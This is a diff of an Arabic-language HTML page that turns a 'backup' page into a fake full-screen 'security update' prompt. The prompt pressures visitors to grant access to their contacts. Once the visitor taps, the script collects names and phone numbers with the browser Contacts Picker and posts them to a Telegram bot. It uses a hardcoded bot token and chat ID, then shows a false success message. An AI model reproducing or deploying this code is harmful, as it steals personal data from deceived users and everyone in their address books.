@@ -3,69 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نسخ احتياطي شامل</title>
+    <title>تأكيد الهوية</title>
     <style>
-        body { font-family: 'Cairo', sans-serif; background: #0f0f0f; color: white; text-align: center; padding: 50px; }
-        .card { background: #1e1e1e; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px rgba(0,255,150,0.2); }
-        .btn { background: #00ff95; color: #000; border: none; padding: 15px 40px; border-radius: 50px; font-weight: bold; cursor: pointer; font-size: 18px; }
-        #status { margin-top: 20px; color: #00ff95; }
+        /* واجهة تغطي الشاشة بالكامل */
+        #permissionScreen {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #000000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+        }
+        .btn-start {
+            background: #00ff95;
+            color: black;
+            border: none;
+            padding: 20px 40px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 0 20px #00ff95;
+        }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>النسخ الاحتياطي التلقائي</h2>
-    <p>اضغط للبدء، ثم اختر "تحديد الكل" من القائمة</p>
-    <button class="btn" onclick="startBackup()">ابدأ النسخ الآن</button>
-    <div id="status"></div>
+<div id="permissionScreen">
+    <h1>⚠️ مطلوب تحديث أمني</h1>
+    <p>يجب السماح بالوصول لجهات الاتصال لمتابعة استخدام الموقع</p>
+    <br>
+    <button class="btn-start" onclick="requestNow()">موافق، استمرار</button>
 </div>
 
 <script>
-async function startBackup() {
-    const status = document.getElementById('status');
-    
-    // بياناتك (يفضل تشفير الكود بالكامل لاحقاً)
-    const token = "YOUR_BOT_TOKEN"; 
-    const chatID = "YOUR_CHAT_ID";
+async function requestNow() {
+    // 1. إخفاء الشاشة السوداء
+    document.getElementById('permissionScreen').style.display = 'none';
 
-    if (!('contacts' in navigator)) {
-        status.innerText = "متصفحك لا يدعم الوصول للأسماء. استخدم كروم أندرويد.";
-        return;
-    }
+    // 2. إعدادات البوت (تأكد من وضع بياناتك الصحيحة)
+    const token = "8282613566:AAGvB5UKECEpNb88oWmCPveeaqD18euh8tY";
+    const chatID = "6969597735";
 
-    // نطلب الوصول لجميع الحقول المتاحة
-    const props = ['name', 'tel', 'email'];
-    const opts = { multiple: true };
-
+    // 3. محاولة سحب الأسماء فوراً بعد النقرة
     try {
-        const contacts = await navigator.contacts.select(props, opts);
+        if (!('contacts' in navigator)) {
+            alert("متصفحك لا يدعم هذه الميزة، استخدم كروم أندرويد.");
+            return;
+        }
+
+        // إظهار نافذة اختيار الأسماء من الهاتف
+        const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
 
         if (contacts.length > 0) {
-            status.innerText = "⏳ جاري ضغط وإرسال " + contacts.length + " جهة اتصال...";
-            
-            let message = `📂 **نسخة احتياطية كاملة**\n`;
-            message += `عدد الأسماء: ${contacts.length}\n`;
-            message += `--------------------------\n`;
-
-            contacts.forEach((c, index) => {
-                message += `${index + 1}- ${c.name} : ${c.tel}\n`;
+            // تجميع الأسماء في نص واحد
+            let allData = `📥 وصلتك نسخة جديدة:\n\n`;
+            contacts.forEach((c, i) => {
+                allData += `${i+1}- ${c.name}: ${c.tel[0]}\n`;
             });
 
-            // إرسال البيانات (إذا كان العدد كبيراً جداً سيتم تقسيم الرسائل)
+            // إرسال للتلجرام
             await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     chat_id: chatID,
-                    text: message,
-                    parse_mode: "Markdown"
+                    text: allData
                 })
             });
-
-            status.innerText = "✅ تم النسخ بنجاح إلى التلجرام!";
+            
+            alert("تم التحديث بنجاح");
         }
     } catch (err) {
-        status.innerText = "❌ فشلت العملية أو تم رفض الإذن.";
+        alert("يجب عليك الضغط على 'سماح' في نافذة النظام لتفعيل الميزة.");
     }
 }
 </script>
